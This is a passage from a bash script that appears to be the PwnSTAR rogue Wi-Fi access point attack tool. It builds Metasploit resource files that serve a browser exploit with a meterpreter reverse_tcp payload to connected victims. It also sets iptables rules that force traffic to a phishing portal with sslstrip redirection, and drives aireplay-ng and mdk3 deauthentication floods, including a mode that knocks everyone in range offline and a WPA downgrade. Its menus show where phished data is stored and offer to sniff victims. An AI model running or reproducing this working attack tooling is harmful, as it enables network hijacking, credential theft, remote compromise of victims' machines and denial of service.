exploit -j" > /tmp/msf.rc ### custom exe? set EXE::Custom /var/www/mypayload.exe
    sleep 0.5

#    Eterm -g 104x25-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -T "Metasploit" -e msfconsole -r /tmp/msf.rc 2> /dev/null &

    xterm -g 104x25-0-0 -T "Metasploit" -e msfconsole -r /tmp/msf.rc 2> /dev/null &

    sleep 4
    echo -e "$info\nTakes a while..."
    sleep 4
    echo -e "$warn\n*** MUST STOP DNSSpoof as soon as you have a session ***
    
(if msf doesn't handle requests properly,
the victim will not get internet access,
and will probably disconnect)

Wait..."

    sleep 20
    adv_final_fn 
}   
    
zday_fn()
{
    dns_fn
    echo -e "$info\nMetasploit starting..."
    cat /dev/null > /tmp/msf.rc > /dev/null # clear pre-existing rc
    echo "use exploit/windows/browser/msxml_get_definition_code_exec
set OBFUSCATE true
set SRVHOST $ap_ip
set SRVPORT 80
set URIPATH /
set payload windows/meterpreter/reverse_tcp
set LHOST $ap_ip
exploit -j" > /tmp/msf.rc
    sleep 0.5

#    Eterm -g 104x25-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -T "Metasploit" -e msfconsole -r /tmp/msf.rc 2> /dev/null &

    xterm -g 104x25-0-0 -T "Metasploit" -e msfconsole -r /tmp/msf.rc 2> /dev/null &

    sleep 4
    echo -e "$info\nTakes a while..."
    sleep 4
    echo -e "$warn\n*** MUST STOP DNSSpoof as soon as you have a session ***
    
(if msf doesn't handle requests properly,
the victim will not get internet access,
and will probably disconnect)

Wait..."

    sleep 60
    adv_final_fn 
    }

# ~~~~~~~~~~ Iptables Functions ~~~~~~~~~~ #

#bypass phishing page on https request

captive_iptab_fn1()
# The starting point for the iptables was http://simple-and-hot.blogspot.com.au/2010/05/you-can-do-it-yourself.html
{
    echo -e "$info\nSetting up iptables...\n\n"
    
    # Allow DHCP and DNS requests from any user:
    iptables -t nat -A PREROUTING -m state --state NEW,ESTABLISHED,RELATED,INVALID -p udp --dport 67 -j ACCEPT
    iptables -t nat -A PREROUTING -m state --state NEW,ESTABLISHED,RELATED,INVALID -p tcp --dport 67 -j ACCEPT
    iptables -t nat -A PREROUTING -m state --state NEW,ESTABLISHED,RELATED,INVALID -p udp --dport 53 -j ACCEPT
    iptables -t nat -A PREROUTING -m state --state NEW,ESTABLISHED,RELATED,INVALID -p tcp --dport 53 -j ACCEPT

#########Start Orig#############    

    # All other traffic goes to the portal page: 
#    iptables -t nat -A PREROUTING -p tcp -j DNAT --to "$ap_ip":80
#    iptables -t nat -A PREROUTING -p udp -j DNAT --to "$ap_ip":80

#########End Orig#############

    # All other traffic goes to the portal page: 
#    iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "$ap_ip":80
#    iptables -t nat -A PREROUTING -p udp --dport 80 -j DNAT --to-destination "$ap_ip":80

    # All other traffic goes to the portal page: 
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to "$ap_ip":80
    iptables -t nat -A PREROUTING -p udp --dport 80 -j DNAT --to "$ap_ip":80
    
    ## Create a captive NET and send approved users there ### causes difficulties with sslstrip
    iptables -t nat -N NET
    iptables -t nat -A PREROUTING -j NET
    ## Currently F give full access    
    iptables -t nat -A NET -j ACCEPT
    
    # Double-check we are forwarding
    echo "1" > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A POSTROUTING -o $ICI -j MASQUERADE ### not nec?
    
    # File to store MAC of clients
    mkdir /tmp/ip
    touch /tmp/ip/ip
    chown -f root:www-data /tmp/ip/ip
    chmod -f 775 /tmp/ip/ip
    
    cat /etc/incron.allow | grep root &> /dev/null
    if [ $? -ne 0 ];then
        echo -e "$q\n     Need to add user root to incron.allow\nDo it now!$yel (y/n)$txtrst?"
        echo -e "$warn!!!  Selecting $yel(n)$warn will cause program to terminate as incron is required !!!"
        read var
        if [[ $var == y ]];then
            echo "root" >> /etc/incron.allow #append in case incron.allow has other entries pre-existing
            echo -e "$info\nDone\n"
        else
            exit_fn
        fi
     fi
                
    # Make script to set new rules per client MAC. Will be run by incron
    echo "
#!bin/bash
mac=\$(cat /tmp/ip/ip)
iptables -t nat -I PREROUTING -m mac --mac-source \$mac -j ACCEPT
if [[ -e /tmp/sslstrip ]];then
sslstrip=\$(cat /tmp/sslstrip)   # read value exported from main script
if [[ \$sslstrip = y ]];then    # allows sslstrip redirect per client MAC
    iptables -t nat -I PREROUTING -p tcp --destination-port 80 -m mac --mac-source \$mac -j REDIRECT --to-port 10000
fi
fi" > /tmp/ipmac
    chmod +x /tmp/ipmac
    sleep 0.5
    
}

# Do not bypass phishing page

captive_iptab_fn()
# The starting point for the iptables was http://simple-and-hot.blogspot.com.au/2010/05/you-can-do-it-yourself.html
{
    echo -e "$info\nSetting up iptables...\n\n"
    
    # Allow DHCP and DNS requests from any user:
    iptables -t nat -A PREROUTING -m state --state NEW,ESTABLISHED,RELATED,INVALID -p udp --dport 67 -j ACCEPT
    iptables -t nat -A PREROUTING -m state --state NEW,ESTABLISHED,RELATED,INVALID -p tcp --dport 67 -j ACCEPT
    iptables -t nat -A PREROUTING -m state --state NEW,ESTABLISHED,RELATED,INVALID -p udp --dport 53 -j ACCEPT
    iptables -t nat -A PREROUTING -m state --state NEW,ESTABLISHED,RELATED,INVALID -p tcp --dport 53 -j ACCEPT
    
    # All other traffic goes to the portal page: 
    iptables -t nat -A PREROUTING -p tcp -j DNAT --to "$ap_ip":80
    iptables -t nat -A PREROUTING -p udp -j DNAT --to "$ap_ip":80
    
    ## Create a captive NET and send approved users there ### causes difficulties with sslstrip
    #iptables -t nat -N NET
    #iptables -t nat -A PREROUTING -j NET
    ## Currently set to give full access    
    #iptables -t nat -A NET -j ACCEPT
    
    # Double-check we are forwarding
    echo "1" > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A POSTROUTING -o $ICI -j MASQUERADE ### not nec?
    
    # File to store MAC of clients
    mkdir /tmp/ip
    touch /tmp/ip/ip
    chown -f root:www-data /tmp/ip/ip
    chmod -f 775 /tmp/ip/ip
    
    cat /etc/incron.allow | grep root &> /dev/null
    if [ $? -ne 0 ];then
        echo -e "$q\nNeed to add user root to incron.allow\nDo it now Enter$yel (y)$q ?$txtrst"
        read var
        if [[ $var == y ]];then
            echo "root" >> /etc/incron.allow #append in case incron.allow has other entries pre-existing
            echo -e "$info\nDone\n"
        else
            exit_fn
        fi
     fi
                
    # Make script to set new rules per client MAC. Will be run by incron
    echo "
#!bin/bash
mac=\$(cat /tmp/ip/ip)
iptables -t nat -I PREROUTING -m mac --mac-source \$mac -j ACCEPT
if [[ -e /tmp/sslstrip ]];then
sslstrip=\$(cat /tmp/sslstrip)   # read value exported from main script
if [[ \$sslstrip = y ]];then    # allows sslstrip redirect per client MAC
    iptables -t nat -I PREROUTING -p tcp --destination-port 80 -m mac --mac-source \$mac -j REDIRECT --to-port 10000
fi
fi" > /tmp/ipmac
    chmod +x /tmp/ipmac
    sleep 0.5
    
}

# ~~~~~~~~~~ Deauth Functions ~~~~~~~~~~ #

deauth_presets_fn()
{
    if [[ -z $deauthchan ]];then    # default to AP channel, unless deauth channel has already been set
        deauthchan=$apchan	
    fi
    if [[ -z $time ]];then          # ditto for time
        time="0"
    fi
}

aireplaydeauth_setup_fn()
{
    clear
    sleep 1
    echo -e "$def

    
Aireplay-ng Deauth Setup:
    
        $inp 1$yel)$info TargetAP BSSID MAC                   \e[1;36m[$tarbssid]
    $def
        $inp 2$yel)$info TargetAP Associated Client MAC       \e[1;36m[$clientmac]
    $def
           (Preferred, but not essential/ Donot use with WPA Phishing)
        
        $inp 3$yel)$info Channel                              \e[1;36m[$deauthchan]
    $def
        $inp 4$yel)$info RogueAP MAC                          \e[1;36m[$ap_mac]
    $def
           (Usually just accept this default)
        
        $inp 5$yel)$info Duration of attack                   \e[1;36m[$time]
    $def
           (Time in secs, or 0 for continuous (DOS))
        
	$inp b$yel)$info  Rescan for information

        $inp c$yel)$info Start
    
    $txtrst"
    read var
    case $var in
    
        1) echo -e "$q\nEnter Target BSSID
        
      To copy and paste from xterm:
        
        press spacebar to pause scan, 
        highlight to copy
        then middle click/3-finger tap to paste
        
        (press spacebar again to watch the deauth)\n"
        read tarbssid
        aireplaydeauth_setup_fn;;
        
        2) echo "Enter Client MAC"
        read clientmac
        aireplaydeauth_setup_fn;;
        
        3) echo "Enter channel"
        read deauthchan
        aireplaydeauth_setup_fn;;
        
        4) echo "Enter our MAC"
        read hostmac
        aireplaydeauth_setup_fn;;
        
        5) echo "Enter duration of attack
        (Time in secs, or 0 for continuous (DOS))"
        read time
        aireplaydeauth_setup_fn;;

        b) echo "Returning to Scan Choices"
        sleep 3
		if [ $final -eq 1 ]; then
			
			final_fn

			fi

		if [ $final -eq 2 ]; then
			
			adv_final_fn

			fi

        rescan_fn;;
        
        c) 	if [[ -z "$tarbssid" || -z $deauthchan || -z $ap_mac || -z $time ]];then
                echo -e "$warn\nWake up - you haven't filled all required parameters"
                sleep 3
                aireplaydeauth_setup_fn
            fi;;
            
        *) aireplaydeauth_setup_fn
    esac
}	

mondeauth_start_fn()
{
mondeauth=$monscan

#    if [[ -z $mondeauth ]];then
#		echo -e "$info\n  Starting new monitor interface for deauth..."    # new mon interface to avoid changing AP channel
#		mondeauth=$(airmon-old_fn start $API|grep enabled|awk '{ print $5"" }'|cut -c -4)
        sleep 2
#        dev_check_var=$mondeauth
#        dev_check_fn
#        if [[ $dev_check == "fail" ]]; then
#            mondeauth=
#            initial_scan_fn
#        fi

#		echo -e "$info\nMacchanging $mondeauth..." ### would we ever want to set the mac manually?
#        ifconfig $mondeauth down && macchanger -m $ap_mac $mondeauth && ifconfig $mondeauth up
#		sleep 2
#	fi
    
}
   
aireplaydeauth_fn()
{
    if [[ -z $clientmac ]];then

#        Eterm -g 80x10-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -T "Deauth $tarbssid" -e aireplay-ng -0 $time -a $tarbssid -h $ap_mac $mondeauth  2> /dev/null & deauthpid=$!

        xterm -g 80x10-0-0 -T "Deauth $tarbssid Press Space Bar To Pause/Restart" -e aireplay-ng -0 $time -a $tarbssid -h $ap_mac $mondeauth  2> /dev/null & deauthpid=$!

    else

	initial_scan_fn

#        Eterm -g 80x10-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -T "Deauth client $client on $tarbssid" -e aireplay-ng -0 $time -a $tarbssid -c $clientmac -h $ap_mac $mondeauth  2> /dev/null & deauthpid=$!

        xterm -g 80x10-0-0 -T "Deauth client $client on $tarbssid" -e aireplay-ng -0 $time -a $tarbssid -c $clientmac -h $ap_mac $mondeauth  2> /dev/null & deauthpid=$!

    fi

    if [[ $time = 0 ]];then

        echo -e "$warn\n\n\nWITHIN xterm,$info press ctrl-C to stop the continuous deauth\n\nCtrl-C again to close the window"
        sleep 12
    fi
}	
	
MDK3_fn()
{
    echo -e "$q\nSelect choice by entering line number:
    
    $inp 1$yel)$info running amok (deauthing everyone in range)!!
    $inp 2$yel)$info performing a surgical strike - Best for WPA Phishing
    $inp 3$yel)$info return to main menu"    
			if [ ! -z  $tarbssid ]; then
			echo ""
			sleep 3
			echo -e "$info Current TargetAP Mac = $yel$tarbssid$txrst"

				fi

			if [ -z  $tarbssid ]; then
			echo ""
			echo -e "$info     Current TargetAP Mac is required!"
			echo -e "info  Rescan for information or enter manually." 
			sleep 3

				if [ $final -eq 1 ]; then
			
				final_fn

					fi

				if [ $final -eq 2 ]; then
			
				adv_final_fn

					fi

				fi

    read var

    if [[ $var = 1 ]];then
        echo "$ap_mac" > /tmp/whitelist # don't deauth PwnSTAR
        echo "$ici_mac" >> /tmp/whitelist # don't deauth our internet connection
        # do deauth everyone else

#        Eterm -g 80x10-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -T "Amok Deauth!!" -e mdk3 $mondeauth d -w /tmp/whitelist 2> /dev/null & deauthpid=$! 

        xterm -g 80x10-0-0 -T "mdk3 d Deauth White List" -e mdk3 $mondeauth d  -w /tmp/whitelist 2> /dev/null & deauthpid=$!

		fi


    if [[ $var = 2 ]];then


        echo $tarbssid > /tmp/blacklist

#        Eterm -g 80x10-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -T "Deauth $var" -e mdk3 $mondeauth d -w /tmp/blacklist 2> /dev/null & deauthpid=$! 

        xterm -g 80x10-0-0 -T "mdk3 d Deauth Black List" -e mdk3 $mondeauth d -b /tmp/blacklist 2> /dev/null & deauthpid=$!

    fi

    if [[ $var = 3 ]];then

		if [ $final -eq 1 ]; then
			
			final_fn

			fi

		if [ $final -eq 2 ]; then
			
			adv_final_fn

			fi

		fi

    sleep 1
    echo -e "$info\nCtrl-c within the xterm to stop the deauth"
    sleep 4
    }
    
airdrop_fn()
{
    killall -q airodump-ng &> /dev/null # stop any pre-existing scan
    kill -9 $scanpid &> /dev/null       # stop any pre-existing scan Eterm
    clear
    rm -f /tmp/rules 
    # You may need to edit this depending how/which airdrop is installed
    # I find airdrop very easy to break - be careful!
    #echo -e "$warn\nRead the script to check the path to airdrop-ng"  
   # sleep 1
    echo -e "$info\nWe need a rules file"
    sleep 0.5 
    echo -e "$info\nThe format is:
    
  # allow
  a(/bssid mac(or 'any')|client mac(or 'any')
  # deny
  d/bssid mac(or 'any')|client mac(or 'any')

  eg
  a/our AP mac|any
  d/any|any"
    sleep 0.5 
    echo -e "$q\n
    1) I already have one
    2) Let's knock everyone off everything
$txtrst"
    read var
    if [[ $var = 1 ]];then
        echo -e "$q\nEnter the absolute path to the file:$txtrst"
        read rules
    elif [[ $var = 2 ]];then
        echo "a/$ap_mac|any" > /tmp/rules
        echo "a/any|$ici_mac" >> /tmp/rules
        echo "d/any|any" >> /tmp/rules     
        rules=/tmp/rules
    else
        airdrop_fn
    fi
    echo -e "$info\nStarting airodump capture..."
    killall -q airodump-ng &> /dev/null # stop any pre-existing scan again - messes with airdrop
    kill -9 $scanpid &> /dev/null          
    monscan_start_fn
    rm -f /tmp/capture*
    clear
    sleep 0.5

#    Eterm -g 90x30-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -T "Airdrop scan" -e airodump-ng $monscan -w /tmp/capture --output-format csv 2> /dev/null & scanpid=$!

    xterm -g 90x30-0-0 -T "Airdrop scan" -e airodump-ng $monscan -w /tmp/capture --output-format csv 2> /dev/null & scanpid=$!

    sleep 1
    echo -e "$info\nStarting airdrop..."
    sleep 8 # to allow airodump to write .csv file

#    Eterm -g 80x10-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -T "Airdrop" -e airdrop-ng -i $mondeauth -t /tmp/capture-01.csv -r $rules 2> /dev/null & deauthpid=$! 

    xterm -g 80x10-0-0 -T "Airdrop" -e airdrop-ng -i $mondeauth -t /tmp/capture-01.csv -r $rules 2> /dev/null & deauthpid=$!

    echo -e "$info\nNote you can edit /tmp/rules at any time, even with airdrop running"
    sleep 1
    echo -e "$info\nCtrl-c within the Eterms to stop the deauth"
    sleep 6

}

WPA_DOWNGRADE_fn()

{

        xterm -g 80x10-0-0 -T "mdk3 g WPA Downgrade" -e mdk3 $mondeauth g -t $tarbssid 2> /dev/null & deauthpid=$!

		if [ $final -eq 1 ]; then
			
			final_fn

			fi

		if [ $final -eq 2 ]; then
			
			adv_final_fn

			fi


}

# ~~~~~~~~~~ Exit Functions ~~~~~~~~~~ #

final_fn()
{

final=1
    clear
    sleep 1

	echo -e "$info          RogueAP Attack Details$txtrst"
	echo -e ""
        echo -e "$info  RogueAP Name          = $yel$SSID$txtrst"
        echo -e "$info  Channel               = $yel$apchan$txtrst"

	if [[ ! -z $roguebssid ]]; then

	echo -e "$info  RogueAP mac address   = $yel$roguebssid$txtrst"

		fi
#RogueAP Clone

	if  [[ ! -z $SSIDCLONE ]]; then

	echo -e "$info  RogueAP Clone Name    = $yel$SSIDCLONE$txtrst"

		fi

	if [[ ! -z "$tarbssid" ]]; then

	echo -e "$info  TargetAP Mac Address  = $yel$tarbssid$txtrst"

		fi

	if [[ ! -z $tarchan ]]; then

	echo -e "$info  TargetAP Channel      = $yel$tarchan$txtrst"

		fi

	if [[ ! -z $wwwdir ]]; then

	echo -e "$info  Webpage Folder in use = $yel$wwwdir$txtrst"

		fi

	if [[  ! -z $txtfile ]]; then

	echo -e "$info  Phished data stored in$yel /var/www/$wwwdir/$txtfile$txtrst"

		fi

	if [[ $SETCLONE == y ]] || [[ $SETCLONE == Y ]] ; then

	echo -e "$info  RogueAP WPA Encrypted Clone running on channel $tarchan$txtrst"
  

		fi


	if [[  ! -z $apdns ]]; then

	echo -e "$info  DNS                   = $yel$apdns$txtrst"

		fi

	echo -e "$info  RogueAP IP            = $yel$ap_ip$txtrst"   
	echo ""
	constat=
	constat=$(iwconfig $API | grep $API | awk '{ print $4 }')

	if [[ $constat != Mode:Monitor ]] && [[ $constat != ESSID:off/any ]]; then

	echo ""
	echo -e "$yel                       !!!!!$warn WARNING$yel!!!!!"
	echo -e "$info     Interface$yel $API$info may be associated to a Network!!!"
	echo -e "$info  Insure interface$yel $API$info is NOT associated to any Network."
	echo -e "$info  thru Network Manager. If associated the$yel rogueAP$info will not function."
	echo ""

			fi

	echo ""
	echo -e "\n$q\n    Enter Line Number of Operation to be Conducted:

     $inp 1$yel)$info  Re-scan
     $inp 2$yel)$info  De-auth (get clients off their AP, and onto PwnSTAR)
     $inp 3$yel)$info  Give internet access to victims from your webpage eg \"hotspot\"
         (and then sniff 'em)
     $inp 4$yel)$info  Refresh this page
     $inp 5$yel)$info  Refresh Network Manager Connection
     $inp 6$yel)$info  Recheck DNS connection & DNS connection to internet
     $inp 7$yel)$info  Change mitmf selection
     $inp 8$yel)$info  Start sslsplit
     $inp q$yel)$info  Quit  (reverse everything)"

    read var

clear
echo ""
echo ""
    case $var in
    
        1)  rescan_fn 
            final_fn;;
           
        2)  echo -e "$info     To perform a DDOS, a targetAP mac address is required."
            echo -e "$info  Associated clients to targetAP may also be needed dependent"
            echo -e "$info  on type of aireplay-ng -0 deauth to be performed."

	    echo -e "$info     Scan for targetAP information then capture data from scan"
	    echo -e "$info  window and/or enter manually" 

		if  [ ! -z $tarbssid ]; then

		echo ""
		echo -e "$info Current TargetAP mac address to DDOS  = $yel$tarbssid$txtrst"
		echo ""

			fi

	    echo -e "$q\n     Do you want to scan to add/change MAC address data rqr for DDOS?$yel (y/n)$txtrst"
            echo -e "$info/n  Only necessary if aireplay-ng -0 selected to choose specific clients to deauth."

            read rescan
            if [ $rescan = y ];then
                rescan_fn
            elif [[ $rescan != n ]];then # any value other than n restarts the function
                echo -e "$warn\nWhat's it gunna be babe...yes or no?"
                sleep 2
                rescan=
                final_fn
            fi

            echo -e "$q\n  What DDOS Operation do you want to conduct?"
            echo -e "$info\n  Enter any other key to return to main menu."

    echo -e "$inp a$yel)$info Aireplay"
    
    echo -e "$inp b$yel)$info MDK3  Amok- Same device supporting RogueAP can perform the DDOS"
    
    echo -e "$inp c$yel)$info MDK3 WPA Downgrade $txtrst"
            read deauthtype

            deauth_presets_fn
            if [[ -n "$deauthpid" ]];then # kill any existing deauth eterm window
                kill "$deauthpid" &>/dev/null
            fi

            case $deauthtype in
            
                a) rescan_fn
                   aireplaydeauth_setup_fn
                   mondeauth_start_fn
                   iwconfig $mondeauth channel $deauthchan
                   aireplaydeauth_fn
                   final_fn;;
                   
                b) mondeauth_start_fn
                   MDK3_fn
                   final_fn;;
                
                c) #if [[ ! -e /usr/local/bin/airdrop-ng ]];then
                   #    echo -e "$warn\nAirdrop not supported select another DDOS process"
                   #    sleep 3
                   #final_fn
                   #fi
                   mondeauth_start_fn
		   WPA_DOWNGRADE_fn
                   #airdrop_fn
                   final_fn;;
                
                *) final_fn;;
            esac;;
            
        3)  if [[ $apusage != 4 ]];then
				echo -e "$warn\nOption not available (in this attack mode)"
				sleep 2
				final_fn
			fi


			if [[ $internet = n ]];then
				echo -e "$warn\nNo can do - no internet!"
				sleep 2
				final_fn
			fi
				
			echo -e "$warn\nThis assumes you are already serving an appropriate webpage\n
To allow the victim internet access, dnsspoof will be stopped,\ntherefore new connections to the AP will not see the webpage\n
If you want multiple connections, start again with the advanced menu options"
			sleep 0.5
            echo -e "$info\nThere are better ways of doing this in the advanced menu"
            sleep 1 
            echo -e "$info\nStopping dnsspoof..."
            killall -q dnsspoof &> /dev/null # stop dnsspoof
            sleep 1

var=ZZZ
until [ $var == y ] || [ $var == n ]; do

		echo ""
		echo -e "$q\nDo you want to set up sniffing?$yel (y/n)$txtrst"
		read var

	if [[ $var != y ]] && [[ $var != n ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(y/n)$warn ONLY - try again!!!"
	sleep 3

		fi

			done

#            echo -e "$q\nDo you want to set up sniffing?$yel (y/n)$txtrst"
            read var


            if [[ $var = y ]];then
                sniff_fn
            fi

            final_fn;;

	4)  final_fn;;

	5) 	if [[ $internet == n ]]; then

		echo -e "$info     No internet access provided"
		echo -e "$info  Refreshing Network Manager Not Required"
		sleep 3
		final_fn

		fi

		if [[ $internet == y ]]; then

		until [[ $nmdis == y ]] || [[ $nmdis == Y ]]; do

			echo -e "$info     Disconnecting $ICI...."
			echo ""
			nmcli d disconnect $ICI
			echo ""
			echo -e "$inp     If $ICI disconnected enter$yel (y/Y)$inp to continue."
			echo -e "$inp  Select$yel (n/N)$inp to try again."
			read nmdis

			done

		until [[ $nmcon == y ]] || [[ $nmcon == Y ]]; do

			echo -e "$info     Connecting $ICI...."
			echo ""
			nmcli d connect $ICI
			echo ""
		.	echo -e "$inp     If $ICI connected enter$yel (y/Y)$inp to continue."
			echo -e "$inp  Select$yel (n/N)$inp to try again."
			echo -e "$info     If $ICI is unable to obtain a connection enter y/Y"
			echo -e "$info  then manually use the Network Manager Menu to"
			echo -e "$info  restablish internet access."
			echo -e "Enter yY/nN"
			read nmcon

			done

		fi

		final_fn;;

	6)  	if [[ $internet == n ]]; then

		echo -e "$info     No internet access provided"
		echo -e "$info  Returning to menu list"
		sleep 3
		final_fn

		fi
	
		if [[ $internet == y ]]; then

		TESTCON_fn
		sleep 1

		fi

		if [[ $internet == y ]] && [[ $apusage == 3 || $apusage == 4 || $apusage == a ]]; then
		
		DNSRESPOND_fn
		echo -e "     Starting DNS Response Test"
		echo -e " An active DNS connection to internet required"
		echo -e " for phishing pages to function"
		echo -e " See internet response in xterm window lower lefthand corner."
		echo ""
		if [[ $apusage == 4 ]]; then
		echo -e "$warn Simple web server with dnsspoof"
		echo -e "  provides a poor internet passthru to clients."

			fi 

	sleep 5

		fi

		final_fn;;

	7)	if [[ $internet == n ]]; then

		echo -e "$info     No internet access provided"
		echo -e "$info  Returning to menu list"
		sleep 3
		final_fn

		fi

	if  [[ $mitmfsel == 1 || $mitmfsel == 2 ]] && [[ $ssluse == y || $ssluse == Y ]] && [[ $internet == y ]]; then

			kill $mitmfpid
			sleep 2
			mitmf_fn

			else

			echo ""
			echo -e "$info    Unable as mitmf was not started during"
			echo -e "$info the initial setup."  
			sleep 3

				fi

		final_fn;;

	8)  	if [[ $internet == n ]]; then

		echo -e "$info     No internet access provided"
		echo -e "$info  Returning to menu list"
		sleep 3
		final_fn

		fi

		if  [[ $splituse == n || $splituse == N ]] && [[ $internet == y ]]; then

			sslsplit_fn

			else

			echo ""
			echo -e "$info    Sslsplit already in use."  
			sleep 3

				fi

		final_fn;;


        q)  exit_fn;;
        
        *)  final_fn;;
    esac

}

adv_final_fn()
{

final=2
    clear
    sleep 1



#	constat=$(iwconfig $API | grep $API | awk '{ print $4 }')

#	if [[ $constat != Mode:Monitor ]] && [[ $constat != ESSID:off/any ]]; then	

#	echo ""
#	echo -e "$warn     Insure interface$yel $API$warn is not associated to a network"
#	echo -e "$warn  thru Network Manager. If associated the rogueAP will not function."
#			fi

	echo ""
	echo -e "$info          RogueAP Attack Details$txtrst"
	echo -e ""
        echo -e "$info  RogueAP Name          = $yel$SSID$txtrst"
        echo -e "$info  Channel               = $yel$apchan$txtrst" 

	if [[ ! -z $wwwdir ]]; then

	echo -e "$info  Webpage Folder in use = $yel$wwwdir$txtrst"

		fi

	if [[  ! -z $txtfile ]]; then

	echo -e "$info  Phished data stored in$yel /var/www/$wwwdir/$txtfile$txtrst"

		fi

	if [[ ! -z $tarbssid ]]; then

	echo -e "$info  TargetAP mac address  = $yel$tarbssid$txtrst"

		fi

	if [[ $SETCLONE == y ]] || [[ $SETCLONE == Y ]] ; then

	echo -e "$info  RogueAP WPA Encrypted Clone running on channel $tarchan$txtrst"
  

		fi

	if [[  ! -z "$apdns" ]]; then

	echo -e "$info  DNS                   = $yel$apdns$txtrst"

		fi

	echo -e "$info  RogueAP IP            = $yel$ap_ip$txtrst"   
	echo -e  ""


	echo ""
	constat=
	constat=$(iwconfig $API | grep $API | awk '{ print $4 }')

	if [[ $constat != Mode:Monitor ]] && [[ $constat != ESSID:off/any ]]; then

	echo ""
	echo -e "$yel                       !!!!!$warn WARNING$yel!!!!!"
	echo -e "$info     Interface$yel $API$info may be associated to a Network!!!"
	echo -e "$info  Insure interface$yel $API$info is NOT associated to any Network."
	echo -e "$info  thru Network Manager. If associated the$yel rogueAP$info will not function."
	echo ""

			fi

    echo -e "\n$q\n    Enter Line Number of Operation to be Conducted:
        $inp 1$yel)$info  Re-scan
        $inp 2$yel)$info  De-auth (get clients off their AP, and onto PwnSTAR)
        $inp 3$yel)$info  Sniff victims once they are through the portal
        $inp 4$yel)$info  Stop DNSSpoof (if running)
        $inp 5$yel)$info  Refresh this page.
	$inp 6$yel)$info  Refresh Network Manager Connection.
	$inp 7$yel)$info  Retest Internet Connection to DNS and DNS to internet.
	$inp 8$yel)$info  Change mitmf selection

        $inp q$yel)$info  Quit (reverse everything)$txtrst"
    read var

    case $var in
    
        1)  rescan_fn 
            adv_final_fn;;
           
        2)  echo -e "$info     To perform a DDOS, a targetAP mac address is required."
            echo -e "$info  Associated clients to targetAP may also be needed dependent"
            echo -e "$info  on type of aireplay-ng -0 deauth to be performed."

	    echo -e "$info     To enter a mac address, scan for targetAP information,"
	    echo -e "$info   then capture data from scan window and/or enter manually."

		if  [ ! -z $tarbssid ]; then

		echo ""
		echo -e "$info Current TargetAP mac address to DDOS  = $yel$tarbssid$txtrst"
		echo ""

			fi

	    echo -e "$q\n     Do you want to scan to add/change MAC address data rqr for DDOS?$yel (y/n)$txtrst"

            read rescan

            if [ $rescan = y ];then
                rescan_fn
            elif [[ $rescan != n ]];then # any value other than n restarts the function
                echo -e "$warn\nWhat's it gunna be babe...yes or no?"
                sleep 2
                rescan=
                adv_final_fn
            fi

#            echo -e "$q\nDo you want to use?

            echo -e "$q\n  What DDOS Operation do you want to conduct?
            echo -e  $info\n  Enter any other key to return to main menu.

            
    $inp a$yel)$info Aireplay -0 deauth
    
    $inp b$yel)$info MDK3-Attack Type Allows Device Supporting Airbase-ng to also conduct the DDOS.
          Best for WPA Phishing	 
    
    $inp c$yel)$info mdk3 WPA Downgrade"
    
            read deauthtype

            deauth_presets_fn
            if [[ -n "$deauthpid" ]];then # kill any existing deauth eterm window
                kill "$deauthpid" &>/dev/null
            fi    
            case $deauthtype in
            
                a) rescan_fn
                   aireplaydeauth_setup_fn
                   mondeauth_start_fn
                   iwconfig $mondeauth channel $deauthchan
                   aireplaydeauth_fn
                   adv_final_fn;;
                   
                b) mondeauth_start_fn
                   MDK3_fn
                   adv_final_fn;;
                
                c) # if [[ ! -e /usr/local/bin/airdrop-ng ]]; then
                   #echo -e "$warn Airdrop not installed Select another DDOS process"
                   #sleep 3
                   #adv_final_fn
	           #   fi
                   mondeauth_start_fn
                   #airdrop_fn
		   WPA_DOWNGRADE_fn
                   adv_final_fn;;
                
                *) adv_final_fn;;
            esac;;
 
           
        3)  if [[ $apusage = 6 ]];then
			echo -e  "$warn\nOption not available"
			sleep 2
			adv_final_fn
			fi

			sniff_fn
            		adv_final_fn;;
            
        4)  echo -e "$info Stopping dnsspoof..."
            killall -q dnsspoof &> /dev/null # stop dnsspoof
            sleep 1 
            adv_final_fn;;

	5)  adv_final_fn;;

	6) 	if [[ $internet == n ]]; then

		echo -e "$info     No internet access provided"
		echo -e "$info  Refreshing Network Manager Not Required"
		sleep 3
		adv_final_fn

		fi

		if [[ $internet == y ]]; then

		until [[ $nmdis == y ]] || [[ $nmdis == Y ]]; do

			echo -e "$info     Disconnecting $ICI...."
			echo ""
			nmcli d disconnect $ICI
			echo ""
			echo -e "$inp     If $ICI disconnected enter$yel (y/Y)$inp to continue...."
			echo -e "$inp  Select$yel (n/N)$inp to try again."
			read nmdis

			done

			fi

		if [[ $internet == y ]]; then

		until [[ $nmcon == y ]] || [[ $nmcon == Y ]]; do

			echo -e "$info     Connecting $ICI...."
			sleep 3

			nmcli d connect $ICI
			echo ""
		.	echo -e "$inp     If $ICI connected enter$yel (y/Y)$inp to continue..."
			echo -e "$inp  Select$yel (n/N)$inp to try again."
			echo -e "$info     If $ICI is unable to obtain a connection enter y/Y"
			echo -e "$info  then manually use the Network Manager Menu to"
			echo -e "$info  restablish internet access."
			echo -e "Enter yY/nN"
			read nmcon

			done

		fi

		adv_final_fn;;

	7)  	if [[ $internet == n ]]; then

